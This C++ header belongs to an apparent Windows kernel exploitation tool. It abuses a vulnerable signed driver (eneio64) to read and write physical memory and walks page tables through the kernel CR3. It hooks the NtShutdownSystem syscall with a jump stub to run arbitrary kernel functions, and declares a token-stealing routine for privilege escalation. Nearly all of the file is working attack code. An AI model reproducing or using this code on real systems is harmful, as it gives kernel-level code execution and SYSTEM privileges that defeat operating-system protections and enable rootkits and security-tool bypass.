#ifndef VDM_HPP
#define VDM_HPP

#include "sdk.hpp"
#include "eneio64.hpp"

#include <array>
#include <cstdint>
#include <functional>
#include <string>
#include <tuple>
#include <utility>
#include <vector>
#include <shared_mutex>

class vdm {
private:
    static constexpr std::pair<const char*, const char*> syscall_hook = { "NtShutdownSystem", "ntdll.dll" };

    SYSTEM_INFO sys_info {};
    uint64_t ntoskrnl_module {};
    uint64_t ntoskrnl_image_base {};
    size_t ntoskrnl_image_size {};
    uint64_t ntoskrnl_cr3 {};
    uint64_t ntoskrnl_eprocess {};

    uint64_t syscall_address {};
    std::shared_ptr<vulnerable_driver> vuln_driver = nullptr;

    std::vector<std::pair<uint64_t, uint32_t>> get_memory_regions(const std::pair<const char*, const char*>& keys);
    std::vector<uint8_t> query_system_information(SYSTEM_INFORMATION_CLASS information_class);
    bool fetch_ntoskrnl_information(uint64_t& address, size_t& size);
    uint64_t fetch_ntoskrnl_export(const std::string& name);
    uint64_t fetch_ntoskrnl_cr3();
    bool virtual_to_physical(uint64_t cr3, uint64_t address, uint64_t& physical_address, uint64_t& page_size, uint64_t& page_offset);
    bool read(uint64_t cr3, uint64_t address, void* buffer, size_t size);
    bool write(uint64_t cr3, uint64_t address, const void* buffer, size_t size);
public:
    explicit vdm(std::shared_ptr<vulnerable_driver> vuln_driver)
             : vuln_driver(std::move(vuln_driver))
             {};
    vdm() = delete;
    uint64_t fetch_e_process(uint64_t pid);
    bool steal_token(uint64_t victim_e_process, uint64_t target_e_process);
    bool initialize();

    template <typename T, typename ... Ts>
    std::invoke_result_t<T, Ts...> syscall(void* addr, Ts ... args) {
        const auto [syscall_name, module] = syscall_hook;
        static const auto target_syscall = GetProcAddress(LoadLibraryA(module), syscall_name);


        uint8_t jmp_code[] = { 0x48, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0x00, 0x00, 0x00, 0x00, // mov rax, 0xdeadbeef
                               0xFF, 0xE0                                                  // jmp rax
                             };

        std::uint8_t orig_bytes[sizeof jmp_code];
        *reinterpret_cast<void**>(jmp_code + 0x2) = addr;
        if (!read(ntoskrnl_cr3, syscall_address, orig_bytes, sizeof(orig_bytes)))
            return {};

        // Write jmp stub
        if (!write(ntoskrnl_cr3, syscall_address, jmp_code, sizeof(jmp_code)))
            return {};

        // Invoke target
        auto result = reinterpret_cast<T>(target_syscall)(args ...);

        // Restore hook
        if (!write(ntoskrnl_cr3, syscall_address, orig_bytes, sizeof(orig_bytes)))
            return {};

        return result;
    }

};

#endif

